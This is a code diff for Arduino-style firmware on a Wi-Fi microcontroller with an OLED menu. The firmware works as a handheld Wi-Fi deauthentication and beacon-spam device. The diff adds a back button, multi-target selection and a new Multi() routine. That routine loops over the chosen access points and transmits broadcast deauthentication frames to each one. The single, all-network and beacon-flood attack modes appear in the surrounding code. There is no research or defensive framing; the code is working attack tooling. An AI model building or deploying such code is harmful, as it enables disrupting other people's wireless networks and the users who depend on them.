@@ -15,12 +15,15 @@
 #include <Wire.h>              
 #include <Adafruit_GFX.h>      
 #include <Adafruit_SSD1306.h>
+//#include <Arduino.h>
+
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
 #define OLED_RESET -1
 #define BTN_DOWN PA12
 #define BTN_UP PA27
 #define BTN_OK PA13
+#define BTN_BACK PB2
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 typedef struct {
   String ssid;
@@ -36,10 +39,18 @@ char *pass = "warwickisbest";
 int current_channel = 1;
 std::vector<WiFiScanResult> scan_results;
 WiFiServer server(80);
+
+std::vector<int> SelectedVector;
+
 bool deauth_running = false;
 uint8_t deauth_bssid[6];
 uint8_t becaon_bssid[6];
 uint16_t deauth_reason;
+void CD(){
+  display.clearDisplay();
+  display.setTextColor(SSD1306_WHITE);
+  display.setTextSize(1);
+}
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
   if (scan_result->scan_complete == 0) { 
@@ -75,6 +86,7 @@ void setup(){
   pinMode(BTN_DOWN, INPUT_PULLUP);
   pinMode(BTN_UP, INPUT_PULLUP);
   pinMode(BTN_OK, INPUT_PULLUP);
+  pinMode(BTN_BACK, INPUT_PULLUP);
   Serial.begin(115200);
   if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
     Serial.println(F("SSD1306 init failed"));
@@ -114,20 +126,75 @@ bool menuscroll = true;
 bool okstate = true;
 int scrollindex = 0;
 int perdeauth = 3;
+unsigned long BPT = 0;
+const unsigned long HTH = 800; //hold
+bool held = false;
 //uint8_t becaon_bssid[6];
+bool contains(std::vector<int>& vec,int value){
+  for (int v : vec){
+    if(v==value){
+      return true;
+    }
+  }
+  return false;
+}
+
+void addValue(std::vector<int>& vec,int value){
+  if(!contains(vec, value)){
+    vec.push_back(value);
+  } else{
+    Serial.print(value);
+    Serial.println("Exits");
+    for (auto IT = vec.begin(); IT != vec.end();){
+      if(*IT == value){
+        IT=vec.erase(IT);
+      }
+      else{
+        ++IT;
+      }
+    }
+    Serial.println("De-selected");
+  }
+}
 void drawssid(){
   while(true){
-    if(digitalRead(BTN_OK)==LOW){
+    if(digitalRead(BTN_BACK)==LOW){
       delay(150);
       break;
     }
+    if(digitalRead(BTN_DOWN)==LOW && digitalRead(BTN_UP)==LOW){
+      delay(150);
+      break;
+    }
+    if(digitalRead(BTN_OK)==LOW){
+      delay(150);
+      addValue(SelectedVector,scrollindex);
+    }
     if(digitalRead(BTN_UP)==LOW){
       delay(150);
+      if(BPT==0){
+        BPT = millis();
+        Serial.println(BPT);
+      }
+      if(millis()-BPT >= HTH){
+        if(!held){
+          held = true;
+          Serial.println(held);
+          break;
+        }
+      }
       if(scrollindex < scan_results.size() - 1){
         scrollindex++;
       }
       SelectedSSID = scan_results[scrollindex].ssid;
       SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
+    }
+    else{
+      BPT = 0;
+      if(held){
+        held = false;
+        break;
+      }
     }
     if(digitalRead(BTN_DOWN)==LOW){
       delay(150);
@@ -150,6 +217,22 @@ void drawssid(){
 
     }
     else display.print(SelectedSSID);
+    bool found = false;
+    //auto it = std::find(SelectedVector.begin(),SelectedVector.end(),scrollindex); Fuck Arduino
+    for(int i=0;i<SelectedVector.size();i++){
+      if(SelectedVector[i]==scrollindex){
+        found = true;
+        break;
+      }
+    }
+    if(found){
+      display.setCursor(105, 25);
+      display.println("[*]");
+    }
+    else{
+      display.setCursor(105, 25);
+      display.println("[ ]");
+    }
     display.setCursor(5, 10);
     display.print(SSIDCh);
     display.display();
@@ -174,6 +257,40 @@ void drawscan(){
     break;
   }
 }
+void Multi(){
+  CD();
+  display.setCursor(5, 25);
+  display.println("Attacking...");
+  display.display();
+  while(true){
+    if(Break){
+      Break=false;
+      break;
+    }
+    int num = 0;
+    if(SelectedVector.size() == 0){
+      SelectedVector.push_back(0);
+    }
+    while(SelectedVector.size()>0){
+      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
+        delay(150);
+        Break = true;
+        break;
+      }
+      memcpy(deauth_bssid,scan_results[SelectedVector[num]].bssid,6);
+      wext_set_channel(WLAN0_NAME,scan_results[SelectedVector[num]].channel);
+      num++;
+      if(num >= SelectedVector.size()){
+        num = 0;
+      }
+      for(int i = 0; i < 10; i++){
+        wifi_tx_deauth_frame(deauth_bssid,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",0);
+        delay(5);
+      }
+      delay(50);
+    }
+  }
+}
 void Single(){
   display.clearDisplay();
   display.setTextColor(SSD1306_WHITE);
@@ -184,7 +301,7 @@ void Single(){
   while(true){
     memcpy(deauth_bssid,scan_results[scrollindex].bssid,6);
     wext_set_channel(WLAN0_NAME,scan_results[scrollindex].channel);
-    if(digitalRead(BTN_OK)==LOW){
+    if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
       delay(100);
       break;
     }
@@ -209,7 +326,7 @@ void All(){
       break;
     }
     for(int i = 0; i<scan_results.size();i++){
-      if(digitalRead(BTN_OK)==LOW){
+      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
         delay(100);
         Break = true;
         break;
@@ -240,7 +357,7 @@ void BecaonDeauth(){
       break;
     }
     for(int i = 0; i<scan_results.size();i++){
-      if(digitalRead(BTN_OK)==LOW){
+      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_OK)==LOW){
         delay(100);
         Break = true;
         break;
@@ -270,7 +387,7 @@ void Becaon(){
       break;
     }
     for(int i = 0; i<scan_results.size();i++){
-      if(digitalRead(BTN_OK)==LOW){
+      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
         delay(100);
         Break = true;
         break;
@@ -307,7 +424,7 @@ void RandomBeacon(){
   display.display();
   while (true){
 
-    if(digitalRead(BTN_OK)==LOW){
+    if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
       delay(50);
       break;
     }
@@ -330,6 +447,9 @@ void RandomBeacon(){
 int becaonstate = 0;
 void BecaonMenu(){
   while(true){
+    if(digitalRead(BTN_BACK)==LOW){
+      break;
+    }
     if(digitalRead(BTN_OK)==LOW){
       delay(120);
       if(becaonstate == 0){
@@ -396,10 +516,13 @@ void BecaonMenu(){
 }
 void drawattack(){
   while(true){
+    if(digitalRead(BTN_BACK)==LOW){
+      break;
+    }
     if(digitalRead(BTN_OK)==LOW){
       delay(150);
       if(attackstate == 0){
-        Single();
+        Multi();
         break;
       }
       if(attackstate == 1){
@@ -435,7 +558,7 @@ void drawattack(){
       display.clearDisplay();
       display.setTextSize(1);
       display.setCursor(5, 5);
-      selectedmenu("Single Deauth Attack");
+      selectedmenu("Deauth Attack");
       display.setCursor(5, 15);
       display.println("All Deauth Attack");
       display.setCursor(5, 25);
@@ -451,7 +574,7 @@ void drawattack(){
       display.clearDisplay();
       display.setTextSize(1);
       display.setCursor(5, 5);
-      display.println("Single Deauth Attack");
+      display.println("Deauth Attack");
       display.setCursor(5, 15);
       selectedmenu("All Deauth Attack");
       display.setCursor(5, 25);
@@ -467,7 +590,7 @@ void drawattack(){
       display.clearDisplay();
       display.setTextSize(1);
       display.setCursor(5, 5);
-      display.println("Single Deauth Attack");
+      display.println("Deauth Attack");
       display.setCursor(5, 15);
       display.println("All Deauth Attack");
       display.setCursor(5, 25);
@@ -483,7 +606,7 @@ void drawattack(){
       display.clearDisplay();
       display.setTextSize(1);
       display.setCursor(5, 5);
-      display.println("Single Deauth Attack");
+      display.println("Deauth Attack");
       display.setCursor(5, 15);
       display.println("All Deauth Attack");
       display.setCursor(5, 25);
@@ -499,7 +622,7 @@ void drawattack(){
       display.clearDisplay();
       display.setTextSize(1);
       display.setCursor(5, 5);
-      display.println("Single Deauth Attack");
+      display.println("Deauth Attack");
       display.setCursor(5, 15);
       display.println("All Deauth Attack");
       display.setCursor(5, 25);
@@ -518,6 +641,7 @@ void selectedmenu(String text){
   display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
 }
 void loop(){
+
   if(menustate == 0){
     delay(50);
     display.clearDisplay();
